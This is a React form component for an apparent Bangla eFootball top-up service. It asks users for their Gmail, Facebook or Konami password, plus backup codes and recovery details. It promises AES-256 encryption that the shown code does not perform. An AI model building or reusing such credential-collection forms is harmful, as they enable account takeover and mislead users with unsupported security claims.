import { useState } from 'react';
import { Mail, Facebook, Key, Shield, AlertCircle } from 'lucide-react';

interface AccountInfoFormProps {
  onSubmit: (accountInfo: AccountInfo) => void;
  gameName?: string;
}

export interface AccountInfo {
  accountType: 'gmail' | 'facebook' | 'konami';
  accountEmail: string;
  accountPassword: string;
  accountBackup?: string;
}

export default function AccountInfoForm({ onSubmit, gameName = 'eFootball' }: AccountInfoFormProps) {
  const [accountType, setAccountType] = useState<'gmail' | 'facebook' | 'konami'>('gmail');
  const [accountEmail, setAccountEmail] = useState('');
  const [accountPassword, setAccountPassword] = useState('');
  const [accountBackup, setAccountBackup] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!accountEmail || !accountPassword) {
      alert('অনুগ্রহ করে সব তথ্য পূরণ করুন');
      return;
    }

    onSubmit({
      accountType,
      accountEmail,
      accountPassword,
      accountBackup: accountBackup || undefined
    });
  };

  return (
    <div className="bg-gradient-to-br from-blue-50 to-purple-50 rounded-2xl p-6 border-2 border-blue-200">
      {/* Header */}
      <div className="flex items-start gap-3 mb-6">
        <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-purple-600 rounded-xl flex items-center justify-center flex-shrink-0">
          <Shield className="w-6 h-6 text-white" />
        </div>
        <div className="flex-1">
          <h3 className="text-lg font-bold text-gray-900 mb-1">
            অ্যাকাউন্ট তথ্য প্রয়োজন
          </h3>
          <p className="text-sm text-gray-600">
            {gameName} টপ আপ এর জন্য আপনার Konami অ্যাকাউন্ট লগইন তথ্য দিন
          </p>
        </div>
      </div>

      {/* Security Notice */}
      <div className="bg-yellow-50 border-2 border-yellow-200 rounded-xl p-4 mb-6">
        <div className="flex gap-3">
          <AlertCircle className="w-5 h-5 text-yellow-600 flex-shrink-0 mt-0.5" />
          <div className="flex-1">
            <p className="text-sm font-semibold text-yellow-900 mb-1">
              নিরাপত্তা নিশ্চয়তা
            </p>
            <p className="text-xs text-yellow-800">
              আপনার অ্যাকাউন্ট তথ্য সম্পূর্ণ নিরাপদ এবং এনক্রিপ্টেড থাকবে। শুধুমাত্র টপ আপ এর জন্য ব্যবহার করা হবে।
            </p>
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-5">
        {/* Account Type */}
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-3">
            অ্যাকাউন্ট টাইপ
          </label>
          <div className="grid grid-cols-3 gap-3">
            <button
              type="button"
              onClick={() => setAccountType('gmail')}
              className={`flex flex-col items-center gap-2 p-4 rounded-xl border-2 transition-all ${
                accountType === 'gmail'
                  ? 'border-blue-500 bg-blue-50 shadow-md'
                  : 'border-gray-200 bg-white hover:border-gray-300'
              }`}
            >
              <Mail className={`w-6 h-6 ${accountType === 'gmail' ? 'text-blue-600' : 'text-gray-400'}`} />
              <span className={`text-sm font-medium ${accountType === 'gmail' ? 'text-blue-900' : 'text-gray-600'}`}>
                Gmail
              </span>
            </button>

            <button
              type="button"
              onClick={() => setAccountType('facebook')}
              className={`flex flex-col items-center gap-2 p-4 rounded-xl border-2 transition-all ${
                accountType === 'facebook'
                  ? 'border-blue-500 bg-blue-50 shadow-md'
                  : 'border-gray-200 bg-white hover:border-gray-300'
              }`}
            >
              <Facebook className={`w-6 h-6 ${accountType === 'facebook' ? 'text-blue-600' : 'text-gray-400'}`} />
              <span className={`text-sm font-medium ${accountType === 'facebook' ? 'text-blue-900' : 'text-gray-600'}`}>
                Facebook
              </span>
            </button>

            <button
              type="button"
              onClick={() => setAccountType('konami')}
              className={`flex flex-col items-center gap-2 p-4 rounded-xl border-2 transition-all ${
                accountType === 'konami'
                  ? 'border-blue-500 bg-blue-50 shadow-md'
                  : 'border-gray-200 bg-white hover:border-gray-300'
              }`}
            >
              <Key className={`w-6 h-6 ${accountType === 'konami' ? 'text-blue-600' : 'text-gray-400'}`} />
              <span className={`text-sm font-medium ${accountType === 'konami' ? 'text-blue-900' : 'text-gray-600'}`}>
                Konami
              </span>
            </button>
          </div>
        </div>

        {/* Email/Number */}
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2">
            ইমেইল / ফোন নম্বর <span className="text-red-500">*</span>
          </label>
          <input
            type="text"
            value={accountEmail}
            onChange={(e) => setAccountEmail(e.target.value)}
            placeholder={accountType === 'facebook' ? 'ফোন নম্বর বা ইমেইল' : 'ইমেইল অ্যাড্রেস'}
            className="w-full px-4 py-3 rounded-xl border-2 border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition-all"
            required
          />
        </div>

        {/* Password */}
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2">
            পাসওয়ার্ড <span className="text-red-500">*</span>
          </label>
          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              value={accountPassword}
              onChange={(e) => setAccountPassword(e.target.value)}
              placeholder="আপনার পাসওয়ার্ড"
              className="w-full px-4 py-3 rounded-xl border-2 border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition-all pr-24"
              required
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-sm font-medium text-blue-600 hover:text-blue-700"
            >
              {showPassword ? 'লুকান' : 'দেখান'}
            </button>
          </div>
        </div>

        {/* Backup Info (Optional) */}
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2">
            ব্যাকআপ তথ্য (যদি থাকে)
          </label>
          <textarea
            value={accountBackup}
            onChange={(e) => setAccountBackup(e.target.value)}
            placeholder="ব্যাকআপ কোড, রিকভারি ইমেইল, বা অন্য কোনো তথ্য"
            className="w-full px-4 py-3 rounded-xl border-2 border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition-all resize-none"
            rows={3}
          />
          <p className="text-xs text-gray-500 mt-2">
            অপশনাল: যদি আপনার অ্যাকাউন্টে ব্যাকআপ কোড বা রিকভারি তথ্য থাকে
          </p>
        </div>

        {/* Submit Button */}
        <button
          type="submit"
          className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-4 rounded-xl shadow-lg hover:shadow-xl transition-all flex items-center justify-center gap-2"
        >
          <Shield className="w-5 h-5" />
          নিরাপদে সংরক্ষণ করুন
        </button>
      </form>

      {/* Privacy Note */}
      <div className="mt-4 p-4 bg-gray-50 rounded-xl">
        <p className="text-xs text-gray-600 text-center">
          🔒 আপনার তথ্য AES-256 এনক্রিপশন দিয়ে সুরক্ষিত থাকবে। আমরা কখনো আপনার পাসওয়ার্ড শেয়ার করি না।
        </p>
      </div>
    </div>
  );
}
